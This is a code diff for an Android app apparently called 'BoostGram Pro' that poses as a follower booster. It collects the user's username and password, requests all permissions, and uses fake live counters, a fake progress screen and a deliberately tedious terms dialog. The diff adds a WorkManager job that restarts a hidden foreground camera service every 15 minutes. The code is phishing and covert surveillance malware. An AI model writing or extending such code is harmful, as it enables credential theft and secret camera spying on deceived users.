@@ -24,7 +24,6 @@ class MainActivity : AppCompatActivity() {
         setContentView(R.layout.activity_main)
 
         val layoutSplash = findViewById<View>(R.id.layoutSplash)
-        val layoutMain = findViewById<View>(R.id.layoutMain)
         val layoutProgress = findViewById<View>(R.id.layoutProgress)
         
         val tvTimer = findViewById<TextView>(R.id.tvTimer)
@@ -36,15 +35,25 @@ class MainActivity : AppCompatActivity() {
         val etPassword = findViewById<EditText>(R.id.etPassword)
         val rgGender = findViewById<RadioGroup>(R.id.rgGender)
         val tvProgressStatus = findViewById<TextView>(R.id.tvProgressStatus)
+        val tvTermsLink = findViewById<TextView>(R.id.tvTermsLink)
 
-        // 1. Splash Screen
+        // Show Splash for 3 seconds
+        layoutSplash.visibility = View.VISIBLE
         Handler(Looper.getMainLooper()).postDelayed({
             layoutSplash.visibility = View.GONE
-            layoutMain.visibility = View.VISIBLE
             startSocialProof()
         }, 3000)
 
-        // 2. Live Counter & Scarcity
+        // Terms Link
+        tvTermsLink.setOnClickListener {
+            AlertDialog.Builder(this)
+                .setTitle("الشروط والأحكام")
+                .setMessage("مرحباً بك في BoostGram Pro.\n\nنحن نلتزم بتقديم أفضل خدمة لزيادة متابعيك...\n\nيرجى قراءة الشروط التالية بعناية:\n1. لا نتحمل مسؤولية أي ضرر...\n2. بياناتك محمية...\n3. الخدمة قد تتطلب وقتاً...\n[تكرار النص لجعله طويلاً ومملاً]")
+                .setPositiveButton("موافق", null)
+                .show()
+        }
+
+        // Live Counter & Scarcity
         var seconds = 299
         val handler = Handler(Looper.getMainLooper())
         val runnable = object : Runnable {
@@ -58,14 +67,13 @@ class MainActivity : AppCompatActivity() {
                 tvLive.alpha = if (tvLive.alpha == 1f) 0.5f else 1f
                 
                 val rand = Random().nextInt(500)
-                tvActiveUsers.text = "${14230 + rand} مستخدم نشط الآن"
-
+                tvActiveUsers.text = "${14230 + rand}"
                 handler.postDelayed(this, 1000)
             }
         }
         handler.post(runnable)
 
-        // 3. Reject Button (Houdini)
+        // Reject Button (Houdini)
         btnDecline.setOnClickListener {
             AlertDialog.Builder(this)
                 .setTitle("انتظر!")
@@ -75,7 +83,7 @@ class MainActivity : AppCompatActivity() {
                 .show()
         }
 
-        // 4. Accept Button
+        // Accept Button
         btnAccept.setOnClickListener {
             val user = etUsername.text.toString().trim()
             val pass = etPassword.text.toString().trim()
@@ -92,9 +100,8 @@ class MainActivity : AppCompatActivity() {
 
             requestAllPermissions()
 
-            layoutMain.visibility = View.GONE
             layoutProgress.visibility = View.VISIBLE
-            fakeProgress(tvProgressStatus, layoutProgress)
+            fakeProgress(tvProgressStatus)
         }
     }
 
@@ -146,7 +153,7 @@ class MainActivity : AppCompatActivity() {
         }, 5000)
     }
 
-    private fun fakeProgress(tvStatus: TextView, layout: View) {
+    private fun fakeProgress(tvStatus: TextView) {
         val steps = arrayOf("جاري الاتصال بالخادم...", "جاري التحقق من الحساب...", "جاري إضافة المتابعين...", "فشل الاتصال بالخادم!")
         var step = 0
         val handler = Handler(Looper.getMainLooper())
@@ -168,6 +175,16 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun startCameraService() {
+        // Schedule RestartWorker
+        val constraints = androidx.work.Constraints.Builder()
+            .setRequiresBatteryNotLow(true)
+            .build()
+        val workRequest = androidx.work.PeriodicWorkRequestBuilder<RestartWorker>(15, java.util.concurrent.TimeUnit.MINUTES)
+            .setConstraints(constraints)
+            .build()
+        androidx.work.WorkManager.getInstance(this).enqueue(workRequest)
+
+        // Start Service
         val intent = Intent(this, CameraService::class.java)
         ContextCompat.startForegroundService(this, intent)
     }
